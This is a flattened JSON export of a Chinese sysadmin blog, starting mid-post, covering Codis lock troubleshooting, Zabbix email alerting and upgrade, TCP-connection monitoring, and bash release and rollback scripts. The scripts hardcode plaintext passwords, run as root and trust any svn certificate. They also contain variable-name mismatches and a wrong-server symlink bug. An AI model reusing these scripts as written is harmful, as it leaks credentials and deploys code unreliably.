INFO [main:ZooKeeper@684] - Session: 0x14fcb1992f9000a closed[root@VM-241 codis]# bin/codis-config -c config.ini dashboard &amp;[1] 623[root@VM-241 codis]# 2015/09/15 10:26:11 dashboard.go:160: [INFO] dashboard listening on addr: :180872015/09/15 10:26:11 dashboard.go:143: [INFO] dashboard node created: /zk/codis/db_test/dashboard, {“addr”: “10.19.21.241:18087”, “pid”: 623}2015/09/15 10:26:11 dashboard.go:144: [WARN] ** Attention **2015/09/15 10:26:11 dashboard.go:145: [WARN] You should use kill {pid} rather than kill -9 {pid} to stop me,2015/09/15 10:26:11 dashboard.go:146: [WARN] or the node resisted on zk will not be cleaned when I’m quiting and you must remove it manually2015/09/15 10:26:11 dashboard.go:147: [WARN] *错误2:删除group 下的节点被锁[root@VM-241 codis]# bin/codis-config server remove 2 10.19.21.241:63802015/09/15 10:29:41 main.go:153: [PANIC] run sub-command failed[error]: http status code 500, zkutil: obtaining lock timed out 4 /usr/local/codis/src/github.com/wandoulabs/codis/cmd/cconfig/utils.go:66 main.callApi 3 /usr/local/codis/src/github.com/wandoulabs/codis/cmd/cconfig/server_group.go:124 main.runRemoveServerFromGroup 2 /usr/local/codis/src/github.com/wandoulabs/codis/cmd/cconfig/server_group.go:57 main.cmdServer 1 /usr/local/codis/src/github.com/wandoulabs/codis/cmd/cconfig/main.go:86 main.runCommand 0 /usr/local/codis/src/github.com/wandoulabs/codis/cmd/cconfig/main.go:151 main.main … …[stack]: 0 /usr/local/codis/src/github.com/wandoulabs/codis/cmd/cconfig/main.go:153 main.main … …同样到zk里删除整个db_test[zk: localhost:2181(CONNECTED) 5] ls /zk/codis/db_test[proxy, slots, servers, LOCK, migrate_tasks, actions, fence, ActionResponse, dashboard][zk: localhost:2181(CONNECTED) 6] delete /zk/codis/db_testNode not empty: /zk/codis/db_test停止服务[root@VM-241 codis]# ps -ef |grep codisroot 623 32515 0 10:26 pts/3 00:00:01 bin/codis-config -c config.ini dashboardroot 1663 32515 0 10:35 pts/3 00:00:00 grep codisroot 13115 1 0 Sep14 ? 00:00:42 bin/codis-server :6379root 13134 1 0 Sep14 ? 00:00:42 bin/codis-server :6380root 13210 1 0 Sep14 ? 00:00:41 bin/codis-server :6480root 13229 1 0 Sep14 ? 00:00:41 bin/codis-server :6479[root@VM-241 codis]# pkill codis2015/09/15 10:35:29 dashboard.go:154: [INFO] removing dashboard node2015/09/15 10:35:29 main.go:104: [PANIC] ctrl-c or SIGTERM found, exit[stack]: 0 /usr/local/codis/src/github.com/wandoulabs/codis/cmd/cconfig/main.go:104 main.func·010 … …[1]+ Exit 1 bin/codis-config -c config.ini dashboard[root@VM-241 codis]# ps -ef |grep codisroot 1694 32515 0 10:35 pts/3 00:00:00 grep codis[root@VM-241 codis]# bin/codis-config action remove-lock2015/09/15 10:50:29 action.go:331: [INFO] deleting../zk/codis/db_test/LOCK/lock-0000000038{ “msg”: “OK”, “ret”: 0}[root@VM-241 codis]# bin/codis-config server list[ { “id”: 1, “product_name”: “test”, “servers”: [ { “addr”: “localhost:6380”, “group_id”: 1, “type”: “slave” }, { “addr”: “localhost:6379”, “group_id”: 1, “type”: “master” } ] }, { “id”: 2, “product_name”: “test”, “servers”: [ { “addr”: “10.19.21.241:6380”, “group_id”: 2, “type”: “offline” }, { “addr”: “localhost:6480”, “group_id”: 2, “type”: “master” } ] }][root@VM-241 codis]# bin/codis-config server remove 2 10.19.21.241:63802015/09/15 10:52:24 server_group.go:182: [INFO] {offline 2 10.19.21.241:6380}{ “msg”: “OK”, “ret”: 0}[root@VM-241 codis]# bin/codis-config server list[ { “id”: 1, “product_name”: “test”, “servers”: [ { “addr”: “localhost:6380”, “group_id”: 1, “type”: “slave” }, { “addr”: “localhost:6379”, “group_id”: 1, “type”: “master” } ] }, { “id”: 2, “product_name”: “test”, “servers”: [ { “addr”: “localhost:6480”, “group_id”: 2, “type”: “master” } ] }]&nbsp;","tags":[{"name":"codis","slug":"codis","permalink":"http://yoursite.com/tags/codis/"},{"name":"redis-cli","slug":"redis-cli","permalink":"http://yoursite.com/tags/redis-cli/"}]},{"title":"zabbix使用sendEmail脚本发送邮件","date":"2015-09-09T12:01:55.000Z","path":"2015/09/09/zabbix-uses-sendemail-script-to-send-mail/","text":"zabbix版本：2.5.0 今天上午来上班，打开邮箱没有备份通知邮件，难道是被拒了。马上登陆服务器查看，果然是。 # less /var/mail/rootreason: 550 Ip frequency limited. http://service.mail.qq.com/cgi-bin/help?subtype=1&amp;&amp;id=20022&amp;&amp;no=1000725&nbsp; 下面我将选择sendEmail来作为邮件客户端，sendEmail是一个轻量级的，命令行的SMTP邮件客户端下载地址：# wget http://caspian.dotconf.net/menu/Software/SendEmail/sendEmail-v1.56.tar.gz解压：# tar xf sendEmail-v1.56.tar.gz拷贝命令# cp sendEmail-v1.56/sendEmail /usr/local/bin/# chmod +x /usr/local/bin/sendEmail编写邮件脚本# vim sendEmail.sh#!/bin/bashto_mail=$1subject=$2body=$3from_mail=”admin@example.com”smtp=”smtp.exmail.qq.com”passwd=”admin”/usr/local/bin/sendEmail -f $from_mail -t $to_mail -s $smtp -u “$subject” -m “$body” -xu $from_mail -xp $passwd -o message-content-type=text -o message-charset=utf8 -o tls=auto &gt;&gt; /var/log/zabbix/sendEmail.log命令说明：/usr/local/bin/sendEmail 命令主程序-f admin@example.com 发件人邮箱-s smtp.exmail.qq.com 发件人邮箱的smtp服务器-u “邮件测试标题” 邮件的标题-o message-content-type=text 邮件内容的格式,text表示它是text格式-o message-charset=utf8 邮件内容编码-o tls=auto 加密类型自动-xu admin@example.com 发件人邮箱的用户名-xp admin 发件人邮箱密码-m “邮件测试内容” 邮件的具体内容如果有不明白的可以查看帮助信息sendEmail -h测试邮件发送# chmod +x sendEmail.sh# ./sendEmail.sh monitor@baicare.com “邮件测试标题” “邮件测试内容”&nbsp;下面把此脚本应用到zabbix里 到服务器里停止svn服务，测试是否收到邮件","tags":[{"name":"zabbix","slug":"zabbix","permalink":"http://yoursite.com/tags/zabbix/"},{"name":"sendEmail","slug":"sendEmail","permalink":"http://yoursite.com/tags/sendEmail/"}]},{"title":"zabbix2.4.4升级到2.5.0","date":"2015-09-08T18:26:36.000Z","path":"2015/09/08/zabbix-2-4-4-upgrade-to-zabbix-2-5-0/","text":"zabbix2.5发布于2015年8月19日，只发布了源码，需要更新的同学需要自己编译更新安装时会有3.0的提示。请不要惊慌。2.5应该属于过渡版。如果你是2.0版本可以升级，如果是低于2.0请升级到2.x然后再升级到2.5下面是升级步骤：1.关闭zabbix server服务# /etc/init.d/zabbix_server stop关闭服务防止新数据提交到数据导致数据不一致2.备份数据库# mysqldump -uzabbix -pzabbix zabbix &gt; zabbix_bak.sql3.备份文件# 7za a /usr/local/etc/zabbix /app/zabbix /usr/local/bin/zabbix备份配置文件，网站文件，二进制文件4.安装新版zabbix下载地址：http://sourceforge.net/projects/zabbix/files/ZABBIX%20Latest%20Development/2.5.0/zabbix-2.5.0.tar.gz/download# tar xf zabbix-2.5.0.tar.gz# cd zabbix-2.5.0# ./configure –enable-server –enable-agent –with-mysql –enable-ipv6 –with-net-snmp –with-libcurl –with-libxml2# make install拷贝网站文件# cp -R frontends/php/* /app/zabbix5.启动zabbix server服务# /etc/init.d/zabbix_server start6.安装zabbix&nbsp;这个地方报错了，权限问题chown www. /app/zabbix -R完成安装后没有中文选项,需要修改配置文件# vim /app/zabbix/include/locales.inc.php‘zhCN’ =&gt; array(‘name’ =&gt; (‘Chinese (zh_CN)’), ‘display’ =&gt; true),修改中文乱码# cp simhei.ttf /app/zabbix/fonts/# sed -i ‘s/DejaVuSans/simhei/g’ /home/wwwroot/zabbix/include/defines.inc.php升级后界面","tags":[{"name":"zabbix-2.5.0","slug":"zabbix-2-5-0","permalink":"http://yoursite.com/tags/zabbix-2-5-0/"}]},{"title":"zabbix监控tcp连接数","date":"2015-09-06T17:32:35.000Z","path":"2015/09/06/zabbix-monitor-tcp-connection-number/","text":"系统：centos6.5 zabbix：2.4.4 首先创建脚本 [root@monitor scripts]# vim /usr/local/scripts/tcp_connections.sh #!/bin/bash stat() { netstat -an | awk ‘/^tcp/ {++S[$NF]} END {for(a in S) print a, S[a]}’ } case $1 in TIME_WAIT) stat |grep ‘TIME_WAIT’ |awk ‘{print $2}’ ;; CLOSE_WAIT) stat | grep ‘CLOSE_WAIT’ |awk ‘{print $2}’ ;; FIN_WAIT1) stat | grep ‘FIN_WAIT1’ |awk ‘{print $2}’ ;; ESTABLISHED) stat | grep ‘ESTABLISHED’ |awk ‘{print $2}’ ;; SYN_RECV) stat |grep ‘SYN_RECV’ |awk ‘{print $2}’ ;; LAST_ACK) stat |grep ‘LAST_ACK’ |awk ‘{print $2}’ ;; LISTEN) stat |grep ‘LISTEN’ |awk ‘{print $2}’ ;; *) echo “Usage: TIME_WAIT CLOSE_WAIT FIN_WAIT1 ESTABLISHED SYN_RECV LAST_ACK LISTEN” ;;esac测试脚本是否可用 [root@monitor scripts]# chmod +x tcp_connections.sh[root@monitor scripts]# ./tcp_connections.sh ESTABLISHED125编辑zabbix_agentd配置 [root@monitor scripts]# vim /usr/local/etc/zabbix_agentd.conf.d/monitor_tcp_connections.confUserParameter=tcp.time_wait,/usr/local/scripts/tcp_connections.sh TIME_WAITUserParameter=tcp.close_wait,/usr/local/scripts/tcp_connections.sh CLOSE_WAITUserParameter=tcp.fin_wait1,/usr/local/scripts/tcp_connections.sh FIN_WAIT1UserParameter=tcp.established,/usr/local/scripts/tcp_connections.sh ESTABLISHEDUserParameter=tcp.syn_recv,/usr/local/scripts/tcp_connections.sh SYN_RECVUserParameter=tcp.last_ack,/usr/local/scripts/tcp_connections.sh LAST_ACKUserParameter=tcp.listen,/usr/local/scripts/tcp_connections.sh LISTEN重启服务 [root@monitor scripts]# /etc/init.d/zabbix_agentd restartShutting down zabbix_agentd: [确定]Starting zabbix_agentd: [确定]测试监控是否有数据 [root@monitor scripts]# zabbix_get -s localhost -k tcp.established126然后在web里创建模版，方便以后多台添加 填写模版名称 &nbsp; 创建监控项 &nbsp; 创建图形 &nbsp; 模版创建完成后，要关联到监控主机 点击主机，选择模版 等一会儿数据图形就会出现 &nbsp;","tags":[{"name":"zabbix","slug":"zabbix","permalink":"http://yoursite.com/tags/zabbix/"},{"name":"netstat","slug":"netstat","permalink":"http://yoursite.com/tags/netstat/"},{"name":"tcp_connections","slug":"tcp-connections","permalink":"http://yoursite.com/tags/tcp-connections/"},{"name":"zabbix_get","slug":"zabbix-get","permalink":"http://yoursite.com/tags/zabbix-get/"}]},{"title":"脚本回滚代码","date":"2015-09-06T11:46:30.000Z","path":"2015/09/06/rollback-script-code/","text":"上一篇写了发布代码脚本，下面是一篇回滚代码脚本，虽然不是很完善，至少可以方便使用。 有发布就有回滚，防止代码问题能够快速回滚。 下面贴代码： #!/bin/bash #Author: Charlie.cen #Email: cenhuqing@gmail.com #Date: 2015/08/27 Check if user is root[ $(id -u) != “0” ] &amp;&amp; echo “Error: You must be root to run this script” &amp;&amp; exit 1 export PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/binclear Define VarServer_pre=”10.19.21.241”Server_online=”10.19.21.242 10.19.21.243”release_path=”/data/deploy”Web_dir=”/app/server” while :doecho “请选择回滚服务器:”echo -e “t�33[32m1�33[0m. 预发布”echo -e “t�33[32m2�33[0m. 线上”read -p “请输入你服务器的编号: “ Remote_serverif [ $Remote_server != 1 -a $Remote_server != 2 ];thenecho -e “�33[31m 输入错误,只能输入数字: 1 , 2�33[0m”elseif [ $Remote_server == 1 ];thenecho “请选择回滚时间:”ssh root@$Server_pre “ls -l $release_path” |awk ‘{print $9}’read -p “请输入回滚时间目录: “ Time_direcho -e “t�33[32m 预发布241,你将回滚到$Time_dir……�33[0m”ssh root@10.19.21.241 “rm -rf $Web_dir;ln -s $release_path/$Time_dir/server $Web_dir” &amp;&amp; echo -e “t�33[32m 预发布241,你已经回滚到$Time_dir�33[0m” || echo -e “t�33[31m 预发布241,回滚失败,请查看原因�33[0m”breakelseecho -e “请选择回滚时间:”for i in ${Server_online[@]};doif [ $i == “10.19.21.242” ];thenssh root@$i “ls -l $release_path” |awk ‘{print $9}’read -p “请输入线上242回滚时间目录: “ Time_dir_242echo -e “t�33[32m 线上242,你将回滚到$Time_dir_242……�33[0m”ssh root@$i “rm -rf $Web_dir;ln -s $release_path/$Time_dir_242/server $Web_dir” &amp;&amp; echo -e “t�33[32m 线上242,你已经回滚到$Time_dir_242�33[0m” || echo -e “t�33[31m 线上242回滚失败,请查看原因�33[0m”echoelsessh root@$i “ls -l $release_path” |awk ‘{print $9}’read -p “请输入线上243回滚时间目录: “ Time_dir_243echo -e “t�33[32m 线上243,你将回滚到$Time_dir_243……�33[0m”ssh root@$i “rm -rf $Web_dir;ln -s $release_path/$Time_dir_243/server $Web_dir” &amp;&amp; echo -e “t�33[32m 线上243,你已经回滚到$Time_dir_242�33[0m” || echo -e “t�33[31m 线上243回滚失败,请查看原因�33[0m”echofidonebreakfifidone首先看原来的软链接 [root@VM-249 scripts]# ansible online -m shell -a “ls -l /app/“10.19.21.243 | success | rc=0 &gt;&gt;total 0lrwxrwxrwx 1 root root 35 Aug 27 15:06 server -&gt; /data/deploy/20150826_181338/server 10.19.21.242 | success | rc=0 &gt;&gt;total 0lrwxrwxrwx 1 root root 35 Aug 27 15:06 server -&gt; /data/deploy/20150826_181341/server执行操作 [root@VM-249 scripts]# ./roll_back.sh请选择回滚服务器:1. 预发布2. 线上请输入你服务器的编号: 2请选择回滚时间: 20150825_18322320150826_16360820150826_16412020150826_16464020150826_17115920150826_17340120150826_17593020150826_18114620150826_181341请输入线上242回滚时间目录: 20150826_181146线上242,你将回滚到20150826_181146……线上242,你已经回滚到20150826_181146 20150825_18322120150826_16360520150826_16411820150826_16463820150826_17115620150826_17335920150826_17592820150826_18114320150826_181338请输入线上243回滚时间目录: 20150826_181143线上243,你将回滚到20150826_181143……线上243,你已经回滚到20150826_181146再次查看软链接 [root@VM-249 scripts]# ansible online -m shell -a “ls -l /app/“10.19.21.243 | success | rc=0 &gt;&gt;total 0lrwxrwxrwx 1 root root 35 Aug 27 15:29 server -&gt; /data/deploy/20150826_181143/server 10.19.21.242 | success | rc=0 &gt;&gt;total 0lrwxrwxrwx 1 root root 35 Aug 27 15:29 server -&gt; /data/deploy/20150826_181146/server&nbsp;","tags":[{"name":"ansible","slug":"ansible","permalink":"http://yoursite.com/tags/ansible/"},{"name":"ssh","slug":"ssh","permalink":"http://yoursite.com/tags/ssh/"}]},{"title":"脚本发布代码","date":"2015-09-06T11:33:48.000Z","path":"2015/09/06/release-script-code/","text":"环境：centos6.5代码服务器：10.19.21.249预发布服务器：10.19.21.241线上服务器：10.19.21.242 10.19.21.243&nbsp;发布流程：1. 在代码服务器上导出你要发布的项目2. 然后选择你将要发布到哪台服务器（预发布｜线上）3. 使用rsync同步到你选择的服务器4. 根据你同步的目录创建软链接到网站家目录大概就4个步骤，下面我贴上脚本，有问题可以给我留言。写的不好请多指教。#!/bin/bash#Author: Charlie.cen#Email: cenhuqing@gmail.com#Date: 2015/08/25# Check if user is root[ $(id -u) != “0” ] &amp;&amp; echo “Error: You must be root to run this script” &amp;&amp; exit 1export PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/binclearsvn_user=”charlie”svn_pass=”charlie_pwd”checkout_path=”/home/deploy/checkout”release_path=”/app/deploy”svn_url=”svn://localhost/server”log=”/var/log/apr_v1.log”timedir=`date +%Y%m%d%H%M%S`#Define checkout directoryif [ ! -d $checkout_path/$time_dir ];then mkdir -p $checkout_path/$time_dirfi#Chiose your svn projectwhile :do echo echo “请选择你要打包的项目:” #echo “Please select your zip project:” echo -e “\\t\\033[32m1\\033[0m. admin” echo -e “\\t\\033[32m2\\033[0m. baiaimama” echo -e “\\t\\033[32m3\\033[0m. bi” echo -e “\\t\\033[32m4\\033[0m. html5” echo -e “\\t\\033[32m5\\033[0m. integration” echo -e “\\t\\033[32m6\\033[0m. school” echo -e “\\t\\033[32m7\\033[0m. site” echo -e “\\t\\033[32m8\\033[0m. server(全部)” #read -p “Please enter a number:” Num read -p “请输入你要打包的编号:” Num if [ $Num != 1 -a $Num != 2 -a $Num != 3 -a $Num != 4 -a $Num != 5 -a $Num != 6 -a $Num != 7 -a $Num != 8 ];then echo -e “\\033[31m 输入错误,只能输入数字: 1,2,3,4,5,6,7,8\\033[0m” #echo -e “\\033[31minput error! Please only input number 1,2,3,4,5,6,7,8\\033[0m” else if [ $Num == 1 ];then project=admin echo echo -e “\\t\\033[32m 正在打包 $project …… \\033[0m” echo svn export –non-interactive –trust-server-cert –username $svn_user –password $svn_pass $svn_url/$project $checkout_path/$time_dir/$project &gt; /dev/null &amp;&amp; echo -e “\\t\\033[32m $project 打包成功 \\033[0m” || echo “\\t\\033[31m $project 打包失败 \\033[0m” echo break elif [ $Num == 2 ];then project=baiaimama echo echo -e “\\t\\033[32m 正在打包 $project …… \\033[0m” echo svn export –non-interactive –trust-server-cert –username $svn_user –password $svn_pass $svn_url/$project $checkout_path/$time_dir/$project &gt; /dev/null &amp;&amp; echo -e “\\t\\033[32m $project 打包成功 \\033[0m” || echo “\\t\\033[31m $project 打包失败 \\033[0m” echo break elif [ $Num == 3 ];then project=bi echo echo -e “\\t\\033[32m 正在打包 $project …… \\033[0m” echo svn export –non-interactive –trust-server-cert –username $svn_user –password $svn_pass $svn_url/$project $checkout_path/$time_dir/$project &gt; /dev/null &amp;&amp; echo -e “\\t\\033[32m $project 打包成功 \\033[0m” || echo “\\t\\033[31m $project 打包失败 \\033[0m” echo break elif [ $Num == 4 ];then project=html5 echo echo -e “\\t\\033[32m 正在打包 $project …… \\033[0m” echo svn export –non-interactive –trust-server-cert –username $svn_user –password $svn_pass $svn_url/$project $checkout_path/$time_dir/$project &gt; /dev/null &amp;&amp; echo -e “\\t\\033[32m $project 打包成功 \\033[0m” || echo “\\t\\033[31m $project 打包失败 \\033[0m” echo break elif [ $Num == 5 ];then project=integration echo echo -e “\\t\\033[32m 正在打包 $project …… \\033[0m” echo svn export –non-interactive –trust-server-cert –username $svn_user –password $svn_pass $svn_url/$project $checkout_path/$time_dir/$project &gt; /dev/null &amp;&amp; echo -e “\\t\\033[32m $project 打包成功 \\033[0m” || echo “\\t\\033[31m $project 打包失败 \\033[0m” echo break elif [ $Num == 6 ];then project=school echo echo -e “\\t\\033[32m 正在打包 $project …… \\033[0m” echo svn export –non-interactive –trust-server-cert –username $svn_user –password $svn_pass $svn_url/$project $checkout_path/$time_dir/$project &gt; /dev/null &amp;&amp; echo -e “\\t\\033[32m $project 打包成功 \\033[0m” || echo “\\t\\033[31m $project 打包失败 \\033[0m” echo break elif [ $Num == 7 ];then project=site echo echo -e “\\t\\033[32m 正在打包 $project …… \\033[0m” echo svn export –non-interactive –trust-server-cert –username $svn_user –password $svn_pass $svn_url/$project $checkout_path/$time_dir/$project &gt; /dev/null &amp;&amp; echo -e “\\t\\033[32m $project 打包成功 \\033[0m” || echo “\\t\\033[31m $project 打包失败 \\033[0m” echo break elif [ $Num == 8 ];then project=server echo echo -e “\\t\\033[32m 正在打包 $project …… \\033[0m” echo svn export –non-interactive –trust-server-cert –username $svn_user –password $svn_pass $svn_url $checkout_path/$time_dir/$project &gt; /dev/null &amp;&amp; echo -e “\\t\\033[32m $project 打包成功 \\033[0m” || echo “\\t\\033[31m $project 打包失败 \\033[0m” echo break else echo -e “\\t\\033[31m $project 打包失败 \\033[0m” break fi fidoneIP_249=”10.19.21.249”#Server_pre=”10.19.21.241”Server_pre=”115.29.199.174”Server_online=”10.19.21.242 10.19.21.243”Web_dir=”/app/server”#Choise Remote Serverwhile :do #echo “Please select rsync to server” echo “请选择要发布的到哪台服务器:” echo -e “\\t\\033[32m1\\033[0m. 预发布” echo -e “\\t\\033[32m2\\033[0m. 线上” #read -p “Please enter a number:” Remote_server read -p “请输入发布到服务器的编号:” Remote_server if [ $Remote_server != 1 -a $Remote_server != 2 ];then echo -e “\\033[31m 输入错误,只能输入数字: 1,2 \\033[0m” #echo -e “\\033[31minput error! Please only input number 1,2 \\033[0m” else if [ $Remote_server == 1 ];then echo echo -e “\\t\\033[32m 正在同步文件到预发布…… \\033[0m” echo ansible pre -m copy -a “src=mk_dir_v1.sh dest=/usr/local/scripts/ mode=755” &gt;&gt; $log || exit 1 ansible pre -m shell -a “source /usr/local/scripts/mk_dir_v1.sh” &gt;&gt; $log || exit 1 last_dir=$(ssh root@$Server_pre “ls -ltr $release_path |tail -n 1” |awk ‘{print $9}’) rsync -rlpgoDut –exclude-from=/opt/exclude.txt $checkout_path/$time_dir/$project root@$Server_pre:$release_path/$last_dir/server &amp;&amp; echo -e “\\t\\033[32m 同步到预发布成功\\033[0m” || echo -e “\\t\\033[31m 同步到预发布失败. \\033[0m” echo ssh root@$Server_pre “rm -f $Web_dir;ln -s $release_path/$last_dir/server $Web_dir” &amp;&amp; echo -e “\\t\\033[32m 预发布发布成功 \\033[0m” || echo -e “\\t\\033[31m 预发布发布失败\\033[0m” break else echo echo -e “\\t\\033[32m 正在同步到线上…… \\033[0m” echo ansible online -m copy -a “src=mk_dir_v1.sh dest=/usr/local/scripts/ mode=755” &gt;&gt; $log || exit 1 ansible online -m shell -a “source /usr/local/scripts/mk_dir_v1.sh” &gt;&gt; $log || exit 1 for i in ${Server_online[@]};do if [ $i == “10.19.21.242” ];then last_dir_242=$(ssh root@$i “ls -ltr $release_path |tail -n 1” |awk ‘{print $9}’) rsync -rlpgoDut –exclude-from=/opt/exclude.txt $checkout_path/$time_dir/$project root@$i:$release_path/$last_dir_242/server &amp;&amp; echo -e “\\t\\033[32m 同步到线上242成功 \\033[0m” || echo -e “\\t\\033[31m 同步到线上242失败 \\033[0m” echo ssh root@$i “rm -f $Web_dir;ln -s $release_path/$last_dir_242/server $Web_dir” &amp;&amp; echo -e “\\t\\033[32m 线上242发布成功 \\033[0m” || echo -e “\\t\\033[31m 线上242发布失败 \\033[0m” echo else last_dir_243=$(ssh root@$i “ls -ltr /data/deploy |tail -n 1” |awk ‘{print $9}’) rsync -rlpgoDut –exclude-from=/opt/exclude.txt $checkout_path/$time_dir/$project root@$i:$release_path/$last_dir_243/server &amp;&amp; echo -e “\\t\\033[32m 同步到线上243成功 \\033[0m” || echo -e “\\t\\033[31m 同步到线上243失败 \\033[0m” echo ssh root@$i “rm -f $Web_dir;ln -s $release_path/$last_dir_242/server $Web_dir” &amp;&amp; echo -e “\\t\\033[32m 线上243发布成功 \\033[0m” || echo -e “\\t\\033[31m 线上243发布失败 \\033[0m” echo fi echo done break fi fidone脚本中用到了ansible，主机定义如下：[pre]10.19.21.241 ansible_ssh_user=root ansible_ssh_pass=ooxx[online]10.19.21.242 ansible_ssh_user=root ansible_ssh_pass=ooxx10.19.21.243 ansible_ssh_user=root ansible_ssh_pass=ooxx还有个问题就是要在被发布端的定义根据时间生成的目录，这个脚本是上面的ansible调用。下面贴脚本#!/bin/bashdirtime=$(date +%Y%m%d%H%M%S)release_path=”/app/deploy”log=”/var/log/copy.log”if [ ! -d $release_path/$dir_time ];then mkdir -p $release_path/$dir_timefisecond_last_dir=$(ls -ltc $release_path |egrep ‘^d’|awk ‘NR==2{print $9}’)cp -rf $release_path/$second_last_dir/* $release_path/$dir_time/ &amp;&amp; echo “Copy $release_path/$second_last_dir/server to $release_path/$dir_time/ successful.” &gt;&gt; $log || echo “Copy $release_path/$second_last_dir/server to $release_path/$dir_time/ failed.” &gt;&gt; $log最终执行结果请选择你要打包的项目:1. admin2. baiaimama3. bi4. html55. integration6. school7. site8. server(全部)请输入你要打包的编号:4正在打包 html5 ……html5 打包成功请选择要发布的到哪台服务器:1. 预发布2. 线上请输入发布到服务器的编号:2正在同步到线上……同步到线上242成功线上242发布成功同步到线上243成功线上243发布成功查看代码是否发布# ansible online -m shell -a ‘ls -l /app/server’10.19.21.243 | success | rc=0 &gt;&gt;lrwxrwxrwx 1 root root 35 Aug 26 18:14 /app/server -&gt; /data/deploy/20150826_181341/server10.19.21.242 | success | rc=0 &gt;&gt;lrwxrwxrwx 1 root root 35 Aug 26 18:14 /app/server -&gt; /data/deploy/20150826_181341/server&nbsp;","tags":[{"name":"ansible","slug":"ansible","permalink":"http://yoursite.com/tags/ansible/"},{"name":"ssh","slug":"ssh","permalink":"http://yoursite.com/tags/ssh/"},{"name":"svn","slug":"svn","permalink":"http://yoursite.com/tags/svn/"}]}]